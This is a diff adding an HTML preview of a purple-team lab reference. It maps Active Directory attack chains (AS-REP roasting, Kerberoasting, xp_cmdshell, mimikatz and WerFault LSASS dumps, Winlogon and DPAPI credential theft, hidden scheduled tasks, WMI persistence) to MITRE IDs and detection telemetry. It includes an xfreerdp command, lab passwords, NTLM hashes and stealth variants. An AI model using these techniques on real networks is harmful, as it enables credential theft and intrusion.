@@ -1,0 +1,2697 @@
+<!DOCTYPE html><html><head><meta charset='utf-8'><title>CAMPAIGNS-METADATA</title><style>
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+       max-width: 52rem; margin: 2rem auto; padding: 0 1.25rem; line-height: 1.55;
+       color: #1f2328; background: #fff; }
+pre { background: #f6f8fa; padding: 1rem; overflow-x: auto; border-radius: 6px; }
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+table { border-collapse: collapse; width: 100%; margin: 1rem 0; font-size: 0.92em; }
+th, td { border: 1px solid #d0d7de; padding: 0.45rem 0.6rem; vertical-align: top; }
+th { background: #f6f8fa; }
+blockquote { border-left: 4px solid #d0d7de; margin-left: 0; padding-left: 1rem; color: #57606a; }
+a { color: #0969da; }
+h1, h2, h3 { scroll-margin-top: 1rem; }
+.banner { background: #fff8c5; border: 1px solid #d4a72c; padding: 0.75rem 1rem;
+           border-radius: 6px; margin-bottom: 1.5rem; font-size: 0.95em; }
+</style></head><body><div class='banner'><strong>Static preview</strong> — generated from <code>attack-matrix\Campaign\CAMPAIGNS-METADATA.md</code>. Regenerate: <code>python tools/render-campaign-preview.py attack-matrix\Campaign\CAMPAIGNS-METADATA.md</code></div><h1>CAMPAIGNS-METADATA.md — Per-Attack Reference</h1>
+<p><strong>Companion to</strong> <a href="CAMPAIGNS.md"><code>CAMPAIGNS.md</code></a>. One metadata block per attack.</p>
+<p><strong>Scope:</strong> 75 campaign attacks (main spine 8 phases + 4 branches) + 14 E exercises + 10 F supply-chain = <strong>99 total</strong>. E and F are standalone exercises — not part of the campaign narrative.</p>
+<p><strong>Source:</strong> Playbooks (<code>ansible/playbooks/</code>), walkthroughs (<code>01-walkthroughs/</code>), five-stream-merge.md, config.json.</p>
+<p><strong>Field guide:</strong></p>
+<ul>
+<li><strong>Playbook</strong> = <code>.yml</code> file + task line(s) that create the misconfig or vulnerability</li>
+<li><strong>ACE#</strong> = Specific Access Control Entry from <code>05-ad-attack-surface.yml</code></li>
+<li><strong>AD object</strong> = The identity being targeted/exploited (user, group, computer, OU)</li>
+<li><strong>Prerequisite</strong> = What must be true for this attack to work (creds, ACLs, config)</li>
+<li><strong>Key telemetry</strong> = Expected ES events per detection source</li>
+</ul>
+<hr />
+<h2>Main Spine — Phases 1–8</h2>
+<h3>Phase 1 — Initial Access (WT003)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>003</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>Core AD (five-stream-merge §3)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1558.004 (AS-REP Roasting)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>AS-REP Roasting</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Sends AS-REQ to KDC for <code>intern_blue</code> who has <code>DONT_REQUIRE_PREAUTH</code>. KDC returns AS-REP encrypted with user's RC4-derived key — crackable offline.</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code> lines 859-866 — Sets <code>DoesNotRequirePreAuth $true</code> on <code>intern_blue</code></td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>Target user has <code>UF_DONT_REQUIRE_PREAUTH</code> (0x400000) in <code>userAccountControl</code></td>
+</tr>
+<tr>
+<td><strong>Target AD object</strong></td>
+<td><code>CN=intern_blue,OU=Detection,DC=child,DC=cadre,DC=local</code> (user)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (192.168.77.60)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>dc02 (192.168.77.11) — KDC for child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>Domain joined?</strong></td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>Starting credential</strong></td>
+<td>None (zero knowledge)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>1nt3rn_Blu3!</code> — low-priv credential in child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4768 (PreAuthType:0, TargetUserName:intern_blue); Zeek kerberos.log (AS-REQ/AS-REP); Suri cadre-ad.rules SID:1000015</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 2 — Credential Harvesting (WT002)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>002</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>Core AD (five-stream-merge §3)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1558.003 (Kerberoasting)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>AES Kerberoasting via ACE bridge</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>ACE#18 gives <code>intern_blue</code> ForceChangePassword on <code>analyst_t2</code>. Reset <code>analyst_t2</code>'s password, get TGT, then request TGS for <code>svc_mssql</code>'s SPN.</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code> — ACE#18 lines 489-519; SPN registration line 827: <code>svc_mssql</code> → <code>MSSQLSvc/mbr01.child.cadre.local:1433</code>.</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>18 (intern_blue → analyst_t2: ForceChangePassword)</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td><code>intern_blue</code> credential (WT003) + ACE#18 on dc02</td>
+</tr>
+<tr>
+<td><strong>Target AD objects</strong></td>
+<td><code>svc_mssql</code> (SPN); <code>analyst_t2</code> (ACE bridge)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (192.168.77.60)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>dc02 (192.168.77.11)</td>
+</tr>
+<tr>
+<td><strong>Domain joined?</strong></td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>s3rv1c3_MSSQL!</code> — MSSQL service account, sysadmin on mbr01</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4738 (password reset), 4769 (TGS, TicketEncryptionType:0x12); Zeek kerberos.log; Suri SID:1000015</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 3 — Execution</h3>
+<h4>WT041 — SQL xp_cmdshell</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>041</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>Core AD</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1059 (Command Interpreter: xp_cmdshell)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>svc_mssql</code> is sysadmin on mbr01 SQL. Execute OS commands via xp_cmdshell.</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>09-sql-wsus-verify.yml</code> — enables xp_cmdshell, mixed mode auth</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td><code>svc_mssql</code> credential (WT002) + xp_cmdshell enabled</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning → mbr01:1433</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>OS command execution as <code>svc_mssql</code> on mbr01</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4624 Type 8, 4688; Sysmon EID 1 (cmd/powershell), 3; Endpt process; Zeek smb.log; PS EID 4104</td>
+</tr>
+</tbody>
+</table>
+<h4>WT042 — CLR Assembly</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>042</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active — alternative SQL execution</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Deploy malicious CLR assembly on mbr02 (CLR enabled, TRUSTWORTHY ON, strict security=0)</td>
+</tr>
+</tbody>
+</table>
+<h4>WT043 — MSSQL Impersonation</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>043</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active — alternative SQL execution</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>analyst_t1</code> has <code>IMPERSONATE sa</code> grant → sysadmin without Kerberoast</td>
+</tr>
+</tbody>
+</table>
+<h3>Branch 3.5 — Credential Theft from SYSTEM</h3>
+<p>We have SYSTEM on mbr01 via GodPotato. analyst_cloud has an active console session (auto-logon). Goal: extract domain credentials for BloodHound collection and lateral movement.</p>
+<h4>3.5F — LSASS Credential Dump (T1003.001)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Tested — SAM dump successful, sekurlsa failed (SeDebugPrivilege)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1003.001 (OS Credential Dumping: LSASS Memory)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>SYSTEM + mimikatz <code>lsadump::sam</code> extracts local account hashes from SAM database</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>GodPotato gives SYSTEM on mbr01. mimikatz <code>lsadump::sam</code> reads the SAM registry hive to extract local account NTLM hashes. <code>sekurlsa::logonpasswords</code> failed because the GodPotato impersonated token lacks SeDebugPrivilege — LSASS memory not readable.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 (GodPotato via xp_cmdshell chain)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (192.168.77.60) → mbr01 (192.168.77.22) via xp_cmdshell</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Local SAM hashes: Administrator (RID 500) NTLM <code>e02bc503339d51f71d913c245d35b50b</code>, vagrant (RID 1000) same hash, svc.elastic (RID 1001) NTLM <code>310673cc1e1c839f19f55d3ee7417b44</code></td>
+</tr>
+<tr>
+<td><strong>Lab security posture</strong></td>
+<td>LSASS PPL: OFF (RunAsPPL deleted), VBS/Credential Guard: OFF (EnableVirtualizationBasedSecurity=0)</td>
+</tr>
+<tr>
+<td><strong>Server 2025 reality</strong></td>
+<td>On default Server 2025 with PPL ON, lsadump::sam still works (reads registry, not LSASS). sekurlsa::logonpasswords would be blocked.</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 10 (process access on lsass.exe), Sysmon EID 1 (mimikatz process create), WinSec 4688</td>
+</tr>
+<tr>
+<td><strong>Tools</strong></td>
+<td>GodPotato.exe, mimikatz.exe (both on mbr01 at <code>C:\Users\Public\</code>)</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5A — Winlogon Registry (T1552.002)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Tested — plaintext password extracted</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1552.002 (Unsecured Credentials: Registry)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Auto-logon credentials stored in plaintext in Winlogon registry keys</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM reads <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code> — <code>DefaultUserName</code>, <code>DefaultPassword</code>, <code>DefaultDomainName</code> contain the auto-logon credentials in plaintext.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + auto-logon configured (by <code>06-member-services.yml</code>)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning → mbr01 via xp_cmdshell</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>child.cadre.local (but analyst_cloud is in cadre.local — cross-domain)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>CADRE\analyst_cloud:Cl0ud_An@lyst!</code> — plaintext domain credential</td>
+</tr>
+<tr>
+<td><strong>Real-world classification</strong></td>
+<td>Misconfiguration discovery. Reportable finding. Common in kiosks, shared workstations, lab environments.</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 12/13 (registry read on Winlogon keys), then 4624 Type 3/10 when credential is used</td>
+</tr>
+<tr>
+<td><strong>Playbook anchor</strong></td>
+<td><code>06-member-services.yml</code> — sets DefaultUserName, DefaultPassword, DefaultDomainName</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5G — Offensive DPAPI via Nemesis (T1555)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1555 (Credentials from Password Stores)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Nemesis 2.2+ automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM on mbr01 extracts DPAPI masterkeys for analyst_cloud → Nemesis decrypts Chromium App-Bound cookies, saved RDP file credentials, Outlook cached creds, WiFi passwords. Bypasses LSASS PPL and Credential Guard (DPAPI is data-at-rest, not in-memory).</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + analyst_cloud has previously saved credentials (browser, RDP file, WiFi profile). Empty profile = weak demo.</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (Nemesis) → mbr01 (SYSTEM)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Decrypted credentials from analyst_cloud profile — browser cookies, RDP saved passwords, WiFi PSKs</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 1 (Nemesis.exe process create), EID 11 (file access to <code>%APPDATA%\Microsoft\Protect\</code>), EID 10 (LSASS-style process access not needed for DPAPI registry read)</td>
+</tr>
+<tr>
+<td><strong>Independent of LSASS protections</strong></td>
+<td>DPAPI masterkeys live in <code>%APPDATA%\Microsoft\Protect\&lt;SID&gt;\</code> and SYSTEM hive — NOT in LSASS process memory. PPL + Credential Guard do NOT block DPAPI access.</td>
+</tr>
+<tr>
+<td><strong>Tool</strong></td>
+<td><a href="https://github.com/SpecterOps/Nemesis">github.com/SpecterOps/Nemesis</a></td>
+</tr>
+</tbody>
+</table>
+<h4>3.5H — ctfmon.exe Password Extraction</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Tested — extraction works from SYSTEM</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1003 (OS Credential Dumping)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Typed passwords persist in ctfmon.exe memory after app close. Not protected by PPL.</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM dumps ctfmon.exe process memory via procdump. Typed passwords (PuTTY, WinSCP, MySQL, SSH) remain in memory minutes/hours after the application closes. ctfmon.exe is NOT a protected process — unlike LSASS with PPL. Credential Guard does NOT protect typed passwords.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + analyst_cloud has typed a password into CLI tools</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning → mbr01 via xp_cmdshell</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>Limitation</strong></td>
+<td>analyst_cloud must have typed a password. Auto-logon doesn't generate typed passwords.</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 10 (process access on ctfmon.exe)</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5I — Token Impersonation ❌</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>❌ Failed — error 1346 (ERROR_NO_SUCH_LOGON_SESSION)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1134 (Access Token Manipulation)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Steal token from analyst_cloud's running process via Win32 API</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>PowerShell script using OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser failed. Session isolation between xp_cmdshell (session 0) and analyst_cloud (session 1). The PowerShell script was also buggy.</td>
+</tr>
+<tr>
+<td><strong>Why it failed</strong></td>
+<td>Not a Microsoft patch — session isolation. GodPotato's impersonated token also lacks SeDebugPrivilege. Correct approach would be incognito.exe or mimikatz token theft, but 3.5F (LSASS dump) is more reliable.</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5B — Scheduled Task as analyst_cloud (Post-Credential)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1053.005 (Scheduled Task)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Create scheduled task running as analyst_cloud using known password</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM creates a scheduled task with <code>/ru CADRE\analyst_cloud /rp Cl0ud_An@lyst!</code>. Task executes SharpHound or arbitrary command as the domain user. Alternative: invisible scheduled task (Security Descriptor deletion).</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + analyst_cloud password from 3.5A</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>SharpHound collection as analyst_cloud — full domain discovery data</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4698 (task create), 4699 (task run), 4624 TargetUserName=analyst_cloud; Sysmon EID 1</td>
+</tr>
+<tr>
+<td><strong>Invisible variant</strong></td>
+<td>Delete <code>HKLM\...\TaskCache\Tree\CADRE-SharpHound\Security</code> → task invisible to schtasks/query, Task Scheduler GUI, Autoruns</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5C — RDP Interactive Session as analyst_cloud (T1021.001)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1021.001 (Remote Services: Remote Desktop Protocol)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Full interactive RDP logon as analyst_cloud using extracted plaintext password</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>From Kali, <code>xfreerdp /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE /cert-ignore</code>. Cross-domain auth works via cadre.local ↔ child.cadre.local trust. Type 10 logon produces highest-fidelity SharpHound data (DCOM users, local group edges, sessions).</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>analyst_cloud password (from 3.5A) + RDP firewall rule + <code>analyst_cloud</code> in Remote Desktop Users on mbr01 (configured by <code>06-member-services.yml</code>)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (192.168.77.60)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>cadre.local → child.cadre.local (cross-domain auth via trust)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>SharpHound session data; full SharpHound run with <code>-c All</code> (session + ACL + trust + local)</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4624 Type 10 (RemoteInteractive), 4624 Type 3 (network auth for xfreerdp); Sysmon EID 3 (TCP :3389); Endpoint network; Zeek RDP.log</td>
+</tr>
+<tr>
+<td><strong>Compared to 3.5B</strong></td>
+<td>3.5B is non-interactive schtasks; 3.5C gives true desktop session, required for SharpHound <code>-c Session,LoggedOn</code> collections</td>
+</tr>
+<tr>
+<td><strong>Companion to 3.5D</strong></td>
+<td>3.5D = payload delivery (initial access simulation); 3.5C = real logon (use when password is already known)</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5D — File Detonation (WT063-068)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1204.002 (User Execution: Malicious File)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>SYSTEM drops payload to analyst_cloud's Downloads. Autologon session exists → user context available.</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM writes malicious file (LNK/CHM/EXE) to <code>C:\Users\analyst_cloud\Downloads\</code>. When analyst_cloud opens it, code runs in their context. Telemetry demo for initial access detection.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + analyst_cloud autologon session</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Code exec as analyst_cloud (if user opens file)</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 1 (process create), 11 (file create), 15 (file stream); Zeek http.log if download from Kali</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5E — Logon Trigger via Startup Folder (T1547.001)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1547.001 (Boot or Logon Autostart Execution: Startup Folder)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Drop SharpHound (or any payload) into <code>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code> — auto-runs on next interactive logon</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM copies payload to analyst_cloud's Startup folder → triggers mbr01 reboot (or waits for autologon) → analyst_cloud logon triggers Startup folder → SharpHound runs in user context. No user click required.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + analyst_cloud has interactive session (auto-logon configured) + profile <code>C:\Users\analyst_cloud</code> exists (verify after first auto-logon)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning → mbr01 via xp_cmdshell</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>SharpHound collection as analyst_cloud — same as 3.5B but uses startup folder instead of schtasks</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4624 Type 2/11 (interactive/batch at logon), WinSec 4688 (SharpHound.exe), Sysmon EID 1 (parent = explorer.exe / logon process), Sysmon EID 11 (Startup file create)</td>
+</tr>
+<tr>
+<td><strong>Vs 3.5B (schtasks)</strong></td>
+<td>Startup folder is simpler (no task XML, no schtasks interaction) but executes on logon (not arbitrary schedule)</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5J — WMI Event Subscriptions (T1546.003)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1546.003 (Event Triggered Execution: WMI Event Subscription)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Fileless persistence — WMI __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM installs WMI event subscription that fires 60s after boot. No disk artifacts, no registry run keys, no scheduled tasks. Survives reboots. Invisible to Autoruns, Run keys, Scheduled Task scanners.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Persistent code execution across reboots — fileless</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 19 (WMI EventFilter), 20 (WMI EventConsumer), 21 (WMI FilterToConsumerBinding)</td>
+</tr>
+<tr>
+<td><strong>Detection</strong></td>
+<td>Only Sysmon 19/20/21 reliably captures this. Most labs don't have these enabled.</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5K — LSASS Dump via WerFault (T1003.001)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1003.001 (OS Credential Dumping: LSASS Memory)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>WerFaultSecure (Microsoft-signed) triggers Windows Error Reporting crash dump of LSASS — stealthier than procdump</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>SYSTEM triggers WerFault on lsass.exe → WER captures full process memory to <code>.dmp</code> → offline extraction with pypykatz/mimikatz. WerFault is signed by Microsoft so EDR often allows it without flagging.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 (GodPotato chain). Compare with 3.5F (procdump) to measure stealth.</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning → mbr01 via xp_cmdshell</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (192.168.77.22)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Same as 3.5F — NTLM hashes + Kerberos tickets from LSASS memory (if sekurlsa succeeds post-WerFault)</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 1 (WerFaultSecure.exe with LSASS as target), Sysmon EID 11 (<code>.dmp</code> file creation in <code>%LOCALAPPDATA%\CrashDumps\</code>), WinSec 4688 (WerFault child of wermgr.exe)</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td><a href="https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/">iPurple.team — LSASS Dump via WER (2025-11-18)</a></td>
+</tr>
+</tbody>
+</table>
+<h4>3.5L — LAPS Extraction (T1552.004)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1552.004 (Unsecured Credentials: Private Keys / LAPS)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Read LAPS-managed local admin passwords from <code>ms-Mcs-AdmPwd</code> attribute on computer objects in AD</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Any user with <code>Read</code> permission on the LAPS attribute (e.g., via ACE#15 <code>analyst_t1 → OU=Operations: GenericWrite</code>) can LDAP-query the local admin password for any LAPS-managed machine.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>Authenticated domain user with LAPS Read permission (verify via BloodHound Phase 4)</td>
+</tr>
+<tr>
